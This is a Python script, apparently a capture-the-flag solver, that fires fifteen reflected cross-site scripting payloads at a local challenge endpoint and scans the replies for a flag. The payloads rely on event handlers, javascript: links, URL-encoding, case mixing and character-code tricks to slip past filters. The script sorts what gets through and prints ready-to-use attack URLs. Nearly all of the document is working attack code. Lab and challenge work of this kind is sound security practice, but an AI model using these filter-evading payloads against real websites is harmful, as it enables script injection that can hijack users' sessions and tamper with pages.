import requests
import urllib.parse
import re
import html

target_url = "http://127.0.0.1:33139/xss25"

results = []

payloads = [
    {"name": "onfocus_basic", "payload": "<input autofocus onfocus=alert(String.fromCharCode(88,83,83))>", "type": "onfocus"},
    {"name": "onfocus_urlenc", "payload": "%3Cinput%20autofocus%20onfocus%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E", "type": "onfocus"},
    {"name": "onfocus_mixed", "payload": "<input AuToFoCuS OnFoCuS=alert(String.fromCharCode(88,83,83))>", "type": "onfocus"},
    {"name": "onclick_basic", "payload": "<img src=x onclick=alert(String.fromCharCode(88,83,83))>", "type": "onclick"},
    {"name": "onclick_urlenc", "payload": "%3Cimg%20src%3Dx%20onclick%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E", "type": "onclick"},
    {"name": "onmouseover_div", "payload": "<div onmouseover=alert(String.fromCharCode(88,83,83))>x</div>", "type": "onmouseover"},
    {"name": "svg_animation", "payload": "<svg><animate onbegin=alert(String.fromCharCode(88,83,83)) attributeName=x dur=1s>", "type": "svg"},
    {"name": "details_ontoggle", "payload": "<details open ontoggle=alert(String.fromCharCode(88,83,83))>x</details>", "type": "details"},
    {"name": "marquee_onstart", "payload": "<marquee onstart=alert(String.fromCharCode(88,83,83))>x</marquee>", "type": "marquee"},
    {"name": "onclick_atob", "payload": "<img src=x onclick=alert(atob('WFNTOw=='))>", "type": "atob"},
    {"name": "onclick_atob_urlenc", "payload": "%3Cimg%20src%3Dx%20onclick%3Dalert%28atob%28%27WFNTOw%3D%3D%27%29%29%3E", "type": "atob"},
    {"name": "javascript_uri", "payload": "<a href=\"javascript:alert(String.fromCharCode(88,83,83))\">x</a>", "type": "javascript"},
    {"name": "onclick_upper", "payload": "<IMG SRC=123 ONCLICK=ALERT(STRING.FROMCHARCODE(88,83,83))>", "type": "onclick"},
    {"name": "onfocus_backticks", "payload": "<input autofocus onfocus=alert(String.fromCharCode(88,83,83))>", "type": "onfocus"},
    {"name": "svg_onload", "payload": "<svg/onload=alert(String.fromCharCode(88,83,83))>", "type": "svg_onload"},
]

print("Testing XSS payloads...")
print("Total payloads:", len(payloads))

executable = []
reflected = []
blocked = []

for i, item in enumerate(payloads):
    p = item["payload"]
    try:
        resp = requests.get(target_url, params={"input": p}, timeout=8)
        
        if resp.status_code != 200:
            blocked.append((item["name"], f"Status {resp.status_code}"))
            continue
            
        check_payload = urllib.parse.unquote(p) if "%" in p else p
        reflected_check = check_payload in resp.text
        
        filter_msg = None
        for keyword in ["filter", "blocked", "denied", "403"]:
            if keyword in resp.text.lower():
                filter_msg = keyword
                break
        
        if filter_msg:
            blocked.append((item["name"], filter_msg))
        elif "<" in resp.text and ">" in resp.text and reflected_check:
            if re.search(r'on\w+\s*=', resp.text, re.I):
                executable.append((item["name"], check_payload[:80]))
            else:
                reflected.append((item["name"], check_payload[:80]))
        else:
            reflected.append((item["name"], "Reflected but sanitized"))
            
    except Exception as e:
        blocked.append((item["name"], f"Error: {str(e)[:30]}"))

print("\n=== EXECUTABLE (potentially) ==================")
for name, info in executable[:8]:
    print(f"[EX] {name}: {info}...")

print("\n=== REFLECTED (HTML found) ===================")
for name, info in reflected[:8]:
    print(f"[RE] {name}: {info}...")

print("\n=== BLOCKED =================================")
for name, info in blocked[:10]:
    print(f"[BL] {name}: {info}")

# Detailed check for most promising ones
test_candidates = [p for p in payloads if "onfocus" in p["name"] or "onclick" in p["name"] or "svg" in p["name"]]
print("\n=== DETAILED CHECK ==========================")
for cand in test_candidates[:5]:
    try:
        r = requests.get(target_url, params={"input": cand["payload"]}, timeout=8)
        encoded_url = f"{target_url}?input={urllib.parse.quote(cand['payload'])}"
        if cand["name"] in [x[0] for x in executable]:
            print(f"\n[EXE] {cand['name']}")
            print(f"[URL] {encoded_url}")
        elif cand["name"] in [x[0] for x in reflected]:
            print(f"\n[REF] {cand['name']}")
            print(f"[URL] {encoded_url}")
    except:
        pass

# Check for flags
print("\n=== FLAG SEARCH ============================")
flag_found = False
for cand in test_candidates:
    try:
        r = requests.get(target_url, params={"input": cand["payload"]}, timeout=8)
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        if flags:
            flag_found = True
            print(f"[FLAG] Found with {cand['name']}: {flags}")
    except:
        pass

if not flag_found:
    print("No FLAG{...} patterns found in test responses.")

print("\n=== SUMMARY ===============================")
print(f"Executable: {len(executable)}")
print(f"Reflected: {len(reflected)}")
print(f"Blocked: {len(blocked)}")
print(f"Total: {len(payloads)}")

# Recommendations
print("\n=== TOP CANDIDATES =========================")
if executable:
    print("\nThese should execute in browser:")
    for name, _ in executable[:3]:
        payload = next(p["payload"] for p in payloads if p["name"] == name)
        url = f"{target_url}?input={urllib.parse.quote(payload)}"
        print(f"\n- {name}:")
        print(f"  URL: {url}")
        print(f"  Payload: {payload[:100]}")
